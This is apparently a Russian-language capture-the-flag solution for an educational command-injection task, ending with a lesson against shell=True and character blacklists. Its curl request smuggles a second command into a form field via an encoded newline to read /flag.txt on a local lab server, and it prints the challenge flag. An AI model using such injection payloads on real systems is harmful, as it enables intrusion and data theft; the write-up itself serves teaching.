# Решение

## Идея

Значение поля передаётся shell. Фильтр блокирует распространённые разделители команд, но пропускает перевод строки. Слово `cat` также запрещено, поэтому нужен другой инструмент чтения.

## Шаги

1. Передать хост и вторую команду через URL-кодированный перевод строки:

   ```bash
   curl --data 'ip=127.0.0.1%0Ahead%20/flag.txt' http://127.0.0.1:5103/
   ```

2. Shell выполнит `ping`, затем `head /flag.txt`.
3. Прочитать флаг в результате.

## Флаг

`edu_ctf{newline_command_injection}`

## Чему учит задача

Чёрные списки символов не делают shell-вызов безопасным. Команды следует запускать массивом аргументов без `shell=True`.
